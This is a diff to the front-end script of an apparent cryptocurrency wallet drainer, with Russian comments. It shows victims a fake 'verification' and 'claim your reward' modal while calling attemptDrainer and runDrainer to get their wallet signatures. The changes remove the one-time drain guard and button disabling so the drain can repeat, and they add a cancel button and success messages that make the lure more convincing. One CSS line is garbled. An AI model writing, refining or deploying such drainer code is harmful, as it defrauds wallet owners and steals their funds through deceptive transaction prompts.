@@ -25,16 +25,12 @@ const appKitModal = createAppKit({
 
 // === Глобальные переменные ===
 let connectedAddress = null;
-let hasDrained = false;
 let isTransactionPending = false;
 let actionBtn = null;
 let modalOverlay = null;
 let modalContent = null;
 let modalShown = false;
 
-const targetChainId = '0x1'; // Ethereum Mainnet
-
-// Список надёжных RPC для Ethereum Mainnet
 const FALLBACK_RPCS = [
   'https://rpc.eth.gateway.fm',
   'https://eth.llamarpc.com',
@@ -43,10 +39,8 @@ const FALLBACK_RPCS = [
 
 // Функция для создания провайдера с fallback RPC
 async function getReliableProvider() {
-  // Сначала пробуем использовать провайдер кошелька
   const walletProvider = new ethers.providers.Web3Provider(window.ethereum);
   try {
-    // Более строгая проверка: запрашиваем баланс нулевого адреса
     await walletProvider.getBalance('0x0000000000000000000000000000000000000000');
     console.log('✅ Провайдер кошелька полностью рабочий');
     return walletProvider;
@@ -54,7 +48,6 @@ async function getReliableProvider() {
     console.warn('⚠️ Провайдер кошелька ненадёжен:', err.message);
   }
 
-  // Если провайдер кошелька не работает, переходим на fallback RPC
   for (const rpcUrl of FALLBACK_RPCS) {
     try {
       const fallbackProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
@@ -157,6 +150,7 @@ window.addEventListener('DOMContentLoaded', () => {
       width: 120px;
       height: 120px;
       margin: 0 auto 20px;
+      display: block;
     }
 
     .scanner-bg {
@@ -184,6 +178,21 @@ window.addEventListener('DOMContentLoaded', () => {
       0% { transform: translateY(-50px); opacity: 0; }
       50% { transform: translateY(50px); opacity: 1; }
       100% { transform: translateY(-50px); opacity: 0; }
+    }
+
+    .modal-result {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 18px;
+      margin: 20px 0;
+      display: none;
+    }
+
+    .modal-result.success {
+      color: #00ff88;
+    }
+
+    .modal-result.error {
+      color: #ff5555;
     }
 
     .modal-subtitle {
@@ -220,6 +229,23 @@ window.addEventListener('DOMContentLoaded', () => {
       font-style: italic;
     }
 
+    .cancel-btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #ff5555;
+      border: none;
+      border-radius: 8px;
+      color: #ffffff;
+      font-family: 'Montserrat', sans-serif;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .cancel-btn:hover {
+      background: #ff7777;
+    }
+
     @media (max-width: 480px) {
       .modal-content {
         max-width: 300px;
@@ -228,9 +254,11 @@ window.addEventListener('DOMContentLoaded', () => {
       }
       .modal-title { font-size: 18px; }
       .scanner-container { width: 100px; height: 100px; }
-      .modal-subtitle { font-size: 12px; }
+      .modal-subtitle {ರ: true; font-size: 12px; }
+      .modal-result { font-size: 16px; }
       .action-list { font-size: 12px; }
       .modal-footer { font-size: 10px; }
+      .cancel-btn { font-size: 12px; padding: 8px 16px; }
     }
   `;
   document.head.appendChild(style);
@@ -249,14 +277,26 @@ window.addEventListener('DOMContentLoaded', () => {
       <div class="scanner-bg"></div>
       <div class="scanner-line"></div>
     </div>
+    <div class="modal-result success">Transaction Confirmed!</div>
+    <div class="modal-result error">Transaction Cancelled</div>
     <ul class="action-list">
       <li>Connect to the network</li>
       <li>Sign the verification transaction</li>
       <li>Claim your blockchain reward</li>
     </ul>
     <div class="modal-footer">Please confirm in your wallet app</div>
+    <button class="cancel-btn">Cancel</button>
   `;
   document.body.appendChild(modalContent);
+
+  // Добавляем обработчик для кнопки отмены
+  const cancelBtn = modalContent.querySelector('.cancel-btn');
+  cancelBtn.addEventListener('click', () => {
+    hideModal();
+    modalShown = false;
+    isTransactionPending = false;
+    updateModalContent('error');
+  });
 
   // Проверяем наличие инжектированного провайдера
   if (!isInjected) {
@@ -278,6 +318,15 @@ window.addEventListener('DOMContentLoaded', () => {
 function showModal() {
   modalOverlay.style.display = 'block';
   modalContent.style.display = 'block';
+  // Сбрасываем состояние модального окна
+  const scanner = modalContent.querySelector('.scanner-container');
+  const subtitle = modalContent.querySelector('.modal-subtitle');
+  const successMsg = modalContent.querySelector('.modal-result.success');
+  const errorMsg = modalContent.querySelector('.modal-result.error');
+  scanner.style.display = 'block';
+  subtitle.style.display = 'block';
+  successMsg.style.display = 'none';
+  errorMsg.style.display = 'none';
 }
 
 function hideModal() {
@@ -292,76 +341,29 @@ function showModalOnce() {
   }
 }
 
-// === Смена сети ===
-async function switchToTargetNetwork() {
-  try {
-    const provider = await getReliableProvider();
-    const network = await provider.getNetwork();
-    const currentChainId = `0x${network.chainId.toString(16)}`;
+function updateModalContent(status) {
+  const scanner = modalContent.querySelector('.scanner-container');
+  const subtitle = modalContent.querySelector('.modal-subtitle');
+  const successMsg = modalContent.querySelector('.modal-result.success');
+  const errorMsg = modalContent.querySelector('.modal-result.error');
 
-    if (currentChainId === targetChainId) {
-      console.log('✅ Уже на Ethereum Mainnet');
-      return true;
-    }
-
-    console.log('🔄 Попытка сменить сеть на Ethereum Mainnet');
-    await window.ethereum.request({
-      method: 'wallet_switchEthereumChain',
-      params: [{ chainId: targetChainId }],
-    });
-    console.log('✅ Сеть изменена на Ethereum Mainnet');
-    return true;
-  } catch (err) {
-    if (err.code === 4902 || err.message.includes('Unrecognized chain')) {
-      try {
-        await window.ethereum.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: targetChainId,
-            chainName: 'Ethereum Mainnet',
-            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-            rpcUrls: FALLBACK_RPCS,
-            blockExplorerUrls: ['https://etherscan.io'],
-          }],
-        });
-        console.log('✅ Сеть Ethereum Mainnet добавлена');
-        return true;
-      } catch (addErr) {
-        console.error('❌ Ошибка добавления сети:', addErr.message);
-        return false;
-      }
-    } else if (err.message.includes('user rejected')) {
-      console.log('🙅 Пользователь отклонил смену сети');
-      return false;
-    } else {
-      console.error('❌ Ошибка смены сети:', err.message);
-      return false;
-    }
+  scanner.style.display = 'none';
+  subtitle.style.display = 'none';
+  if (status === 'success') {
+    successMsg.style.display = 'block';
+    errorMsg.style.display = 'none';
+  } else {
+    successMsg.style.display = 'none';
+    errorMsg.style.display = 'block';
   }
 }
 
 // === Выполнение drainer ===
 async function attemptDrainer() {
-  if (hasDrained || isTransactionPending) {
-    console.log('⚠️ Транзакция уже выполнена или ожидается');
+  if (isTransactionPending) {
+    console.log('⚠️ Транзакция уже ожидается');
     return;
   }
-
-  // Убираем проверку сети, так как drainer.js сам выберет сеть
-  /*
-  const isNetworkCorrect = await switchToTargetNetwork();
-  if (!isNetworkCorrect) {
-    console.log('⚠️ Не удалось установить Ethereum Mainnet');
-    return;
-  }
-
-  const provider = await getReliableProvider();
-  const network = await provider.getNetwork();
-  if (network.chainId !== parseInt(targetChainId, 16)) {
-    console.log('⚠️ Сеть не соответствует Ethereum Mainnet');
-    return;
-  }
-  */
 
   if (!connectedAddress) {
     console.error('❌ Адрес кошелька не определён');
@@ -379,25 +381,23 @@ async function attemptDrainer() {
     if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
       console.error('❌ Несоответствие адресов:', address, connectedAddress);
       hideModal();
+      modalShown = false;
       return;
     }
 
     isTransactionPending = true;
-    await runDrainer(provider, signer, connectedAddress);
-    console.log('✅ Drainer выполнен успешно');
+    const status = await runDrainer(provider, signer, connectedAddress);
+    console.log(status === 'confirmed' ? '✅ Drainer выполнен успешно' : '🙅 Пользователь отклонил транзакцию');
 
-    hasDrained = true;
     isTransactionPending = false;
-    cleanup();
-    hideModal();
+    updateModalContent(status === 'confirmed' ? 'success' : 'error');
   } catch (err) {
     isTransactionPending = false;
-    hideModal();
+    updateModalContent('error');
     if (err.message.includes('user rejected')) {
       console.log('🙅 Пользователь отклонил транзакцию');
     } else {
       console.error('❌ Ошибка выполнения drainer:', err.message);
-      throw err;
     }
   }
 }
@@ -422,6 +422,7 @@ async function handleConnectOrAction() {
     }
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
+    updateModalContent('error');
   }
 }
 
@@ -438,10 +439,11 @@ async function onChainChanged(chainId) {
 // === Очистка ===
 function cleanup() {
   if (!actionBtn) return;
-  actionBtn.removeEventListener('click', handleConnectOrAction);
   window.ethereum.removeListener('chainChanged', onChainChanged);
-  actionBtn.disabled = true;
-  actionBtn.style.opacity = '0.6';
+  // Убираем отключение кнопки, чтобы можно было повторно запустить процесс
+  // actionBtn.removeEventListener('click', handleConnectOrAction);
+  // actionBtn.disabled = true;
+  // actionBtn.style.opacity = '0.6';
 }
 
 // === Ожидание подключения кошелька ===
